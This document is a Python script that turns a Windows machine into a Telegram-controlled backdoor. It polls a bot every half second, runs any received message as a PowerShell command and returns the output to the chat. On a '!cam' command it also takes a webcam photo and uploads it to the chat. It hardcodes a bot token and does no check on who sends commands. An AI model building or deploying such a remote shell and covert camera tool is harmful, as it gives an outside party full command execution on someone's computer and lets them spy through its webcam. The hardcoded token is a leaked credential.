import os
import subprocess
import json
import requests
import time
import urllib
import cv2


cam_port = 0


# telegram bot token and url setting
TOKEN = "5760436991:AAEHdyCMG79tXWYGJygHaraL1ju21z3RpGI"
URL = "https://api.telegram.org/bot{}/".format(TOKEN)


# send photo taken to telegram chat
def send_photo(file_opened, chat_id):
    method = "sendPhoto"
    params = {'chat_id': chat_id}
    files = {'photo': file_opened}
    resp = requests.post(URL + method, params, files=files)
    return resp


# run commands using subprocess whilst ensuring the output generated is captured
def run_command(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return str(completed)

# function to perform get request on provided url
def get_url(url):
    response = requests.get(url)
    content = response.content.decode("utf8")
    return content

# get json from url used to get chat logs to determine latest message in chat
def get_json_from_url(url):
    content = get_url(url)
    js = json.loads(content)
    return js

# get updates from bot api to download telegram message logs
def get_updates(offset=None):
    url = URL + "getUpdates"
    if offset:
        url += "?offset={}".format(offset)
    js = get_json_from_url(url)
    return js

# getting the latest message using update id 
# the latest update has the highest valued id
def get_last_update_id(updates):
    update_ids = []
    for update in updates["result"]:
        update_ids.append(int(update["update_id"]))
    return max(update_ids)

# get last chat id and the text from user to 
# perform action specified
def get_command(updates):
    text, chat_id = get_last_chat_id_and_text(updates)
    # print(text)
    if "!cam" in text:
        cmd = text.split()
        # print(cmd)
        cam = cv2.VideoCapture(cam_port)
        result, image = cam.read()
        # print(result)
        if result:
            #line to give a default image name or provided name
            filename = "img1.png" if len(cmd) == 1 else cmd[1]
            # cv2.imshow("img", image)
            cv2.imwrite(filename, image)
            cam.release()
            send_message("photo taken, please wait...", chat_id)
            with open(filename, "rb") as img_file:
                send_photo(img_file, chat_id)
            
    else:
        text = run_command(text)
        send_message(text,chat_id)

#function to get the last chat id and text provided
def get_last_chat_id_and_text(updates):
    num_updates = len(updates["result"])
    last_update = num_updates - 1
    text = updates["result"][last_update]["message"]["text"]
    chat_id = updates["result"][last_update]["message"]["chat"]["id"]
    return (text, chat_id)

#function to send message to telegram chat
def send_message(text, chat_id):
    text = urllib.parse.quote_plus(text)
    text.replace("\n","")
    url = URL + "sendMessage?text={}&chat_id={}".format(text, chat_id)
    get_url(url)


# the driver code where every 0.5 seconds the code checks for updates in chat
# to erform required tasks, i.e., run commands or take photo from webcam
def main():
    last_update_id = None
    while True:
        updates = get_updates(last_update_id)
        if len(updates["result"]) > 0:
            last_update_id = get_last_update_id(updates) + 1
            get_command(updates)
        time.sleep(0.5)


if __name__ == '__main__':
    main()



